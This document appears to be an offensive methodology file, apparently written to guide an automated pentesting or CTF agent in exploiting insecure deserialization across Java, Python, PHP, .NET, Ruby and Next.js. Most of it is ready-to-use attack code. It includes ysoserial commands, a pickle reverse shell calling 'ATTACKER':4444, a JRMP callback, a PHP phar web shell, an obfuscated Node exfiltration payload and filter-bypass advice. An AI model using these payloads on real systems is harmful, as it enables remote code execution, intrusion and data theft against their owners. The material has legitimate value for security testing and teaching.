# Insecure Deserialization

## Trigger

Load deserialization methodology when ANY of these signals appear:
- Base64 blobs that decode to non-text binary: Java serialized data starts with `rO0AB` (base64) or `aced0005` (hex), Python pickle starts with `\x80\x04` (protocol 4+), .NET `\x00\x01\x00\x00\x00\xff\xff`
- `Content-Type: application/x-java-serialized-object`, `application/xml` (XMLDecoder), or `application/json` with `$type` fields (.NET TypeNameHandling)
- Cookie values that are base64-encoded and decode to binary (PHP session cookies, Flask session cookies with pickle serializer, Java cookies)
- Source code containing: `unserialize()`, `pickle.loads()`, `ObjectInputStream.readObject()`, `yaml.load()`, `eval()`, `read()` (Ruby), `Marshal.load`
- Hidden form fields or ViewState parameters with base64-encoded content
- Technology: Java (JSF ViewState, Spring, Struts), PHP (Laravel, WordPress plugins), Python (Flask/Tornado sessions), .NET (ViewState, BinaryFormatter), Ruby (Rails session store)
- Binary file uploads processed as serialized objects (ML `.pkl`, `.joblib`, `.npy`, serialized model files)

## Attack Surface

- Session/cookie deserialization in all languages (Java cookie, PHP session, Flask session, Rails session)
- REST/GraphQL API endpoints accepting serialized objects as POST body
- File upload of serialized data files (ML models, game saves, IDE project files)
- ViewState / hidden field deserialization in ASP.NET and JSF
- Cache deserialization (Redis, Memcached values that are deserialized on read)
- Message queue consumers (RabbitMQ, Kafka) that deserialize message payloads
- YAML/XML configuration deserialization endpoints
- Any `phar://` stream wrapper access (PHP phar metadata deserialization)
- React Server Components using Flight protocol (Next.js Server Actions)

## Decision Tree

```
1. Identify format → Check magic bytes
   ├─ AC ED 00 05 → Java serialization
   ├─ \x80\x04\x95 → Python pickle (protocol 4+)
   ├─ O:digit:"class" → PHP serialized object
   ├─ $type field in JSON → .NET TypeNameHandling
   └─ Base64 blob in cookie → decode and inspect

2. Find gadget chains → Use language-appropriate tools
   ├─ Java → ysoserial (CommonsCollections, Spring, JNDI)
   ├─ PHP → phpggc (Laravel, ThinkPHP, WordPress, Symfony)
   ├─ Python → pickle __reduce__ (builtins)
   ├─ .NET → ysoserial.net (ObjectDataProvider, ActivitySurrogateSelector)
   └─ Ruby → universal gadgets or application-specific

3. Deliver payload → Inject into cookie, POST body, file upload
     └─ If filter blocks classes → try alternative chains or JNDI/RMI callback
```

## Techniques

### Java Deserialization (ysoserial)

```bash
# Generate RCE payload
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag' > payload.ser

# Blind detection via DNS callback (no RCE)
java -jar ysoserial.jar URLDNS 'http://COLLABORATOR' | base64

# Alternative chains (try if CommonsCollections blocked):
java -jar ysoserial.jar CommonsBeanutils1 'id'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Jdk7u21 'id'

# JNDI injection (Java 8-11):
java -jar ysoserial.jar JRMPClient 'ATTACKER:1099'
# Then run: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'id'
```

**Detection:**
```python
import base64, re

data = "rO0ABXXXX..."  # suspect base64 blob
decoded = base64.b64decode(data, validate=False)
if decoded[:2] == b'\xac\xed' or decoded[:4] == b'\xac\xed\x00\x05':
    print("[+] Java serialized object detected")
```

### Python Pickle Deserialization

```python
import pickle, base64, os, subprocess

# Basic RCE via __reduce__
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# Reverse shell via exec
class RevShell:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))

# Multi-step chaining (pickle STOP opcode strip)
class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

# Strip STOP from first payload so both execute
chained = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

**Werkzeug SecureCookie pickle RCE (after SECRET_KEY leak):**
```python
from werkzeug.contrib.securecookie import SecureCookie
import subprocess

class Pwn:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag'],))

cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
```

### PHP Insecure Deserialization

**Serialized object format:**
```
O:5:"CLASS":2:{s:4:"prop";s:5:"value";}
a:1:{i:0;s:5:"hello";}
```

**POP chain via SoapClient CRLF SSRF:**
```php
// When deserialized object has __call() triggered, SoapClient fires HTTP request
$p = array(
    'uri' => "http://127.0.0.1:8080 /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Length: 42\r\n\r\nusername=admin&password=x\r\n\r\nPOST /foo\r\n",
    'location' => 'http://127.0.0.1:8080'
);
$payload = serialize(new SoapClient(null, $p));
```

**Phar deserialization (triggered on any phar:// filesystem operation):**
```php
// Create phar with malicious metadata
class Exploit {
    function __destruct() { system($_GET['c']); }
}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->stopBuffering();

// Trigger via any filesystem function: file_exists("phar://exploit.phar")
```

**Serialized Cookie Injection:**
```
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```

### .NET Deserialization

**JSON TypeNameHandling:**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}
```

**ysoserial.net generation:**
```bash
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"
```

### Java XMLDecoder Deserialization

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>cat /flag</string></void>
    </array>
  </void>
</object>
```

### Ruby Marshal.load

```ruby
# Universal RCE via Marshal payload
class RCE
  def initialize(cmd)
    @cmd = cmd
  end
  def marshal_dump
    @cmd
  end
  def marshal_load(cmd)
    @cmd = cmd
  end
  def method_missing(*args)
    system(@cmd)
  end
end

payload = Marshal.dump(RCE.new('id'))
```

### React Server Components Flight Protocol RCE

```http
POST / HTTP/1.1
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

FAKE FLIGHT CHUNK (constructor chain)
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

**Exfiltration via NEXT_REDIRECT header:**
```javascript
var p=process;
var m=p['main'+'Module'];
var r=m['requ'+'ire'];
var c=r('child_process');
var o=c['execSync']('id').toString();
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest:'NEXT_REDIRECT;push;/login?a='+encodeURIComponent(o)+';307;'
});
```

## Bypass

### Filter/Blocklist Bypass

- Java: If `ObjectInputStream` subclass blocks classes, try `ysoserial-modified` or `GadgetProbe` to enumerate available gadgets
- Java 17+: Module restrictions break classic chains; try Fastjson/Jackson deserialization, or application-specific gadgets
- Python: `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
- Python: YAML `!!python/object/apply:os.system` bypasses pickle filters
- PHP: String length manipulation — post-serialization word replacement (e.g., "where" -> "hacker") corrupts length boundaries
- .NET: Custom `SerializationBinder` allowlist — look for deserialization in other libraries (Newtonsoft vs BinaryFormatter vs DataContractSerializer)

### Obfuscation Layers

- Base64/Hex/ROT13 wrapping: Compose inverse transforms before sending — the underlying serialization format is unchanged
- Double URL encoding: When the server URL-decodes before deserializing, double-encode to bypass WAF rules

## Verification

- Java `URLDNS` chain: Execute in isolated environment, observe DNS callback (no RCE, pure blind detection)
- Time-based: Inject `sleep(5)` — response delay confirms code execution
- PHP Phar: `file_exists('phar://exploit.phar')` triggers `__destruct` — use on any filesystem access endpoint
- Error-based: Deliberately malformed serialized objects produce distinct error messages when deserialization is attempted
- OOB: Inject `curl/dig` callback in payload to confirm execution

## Pitfalls

- Java serialization version mismatch: The gadget chain classes must exist on the server classpath — test with `URLDNS` first (classpath-independent)
- Java 17+ module system breaks many classic ysoserial chains — test gadget compatibility with the target JVM version
- PHP `unserialize()` only triggers `__wakeup()` and `__destruct()` — the full POP chain requires finding the right method sequence
- Python pickle is NOT sandbox-safe — there is NO safe way to deserialize untrusted pickle data
- .NET TypeNameHandling must be `All` or `Objects` to exploit — `None` is the safe default
- Ruby `Marshal.load` is equivalent to `eval` — any Marshal data from untrusted sources is RCE
- PHP phar deserialization triggers on ANY filesystem function that accepts `phar://` — including `file_exists()`, `is_dir()`, `file_get_contents()`
- Deserialization payloads often contain raw binary — use `--data-binary` in curl, not `-d`
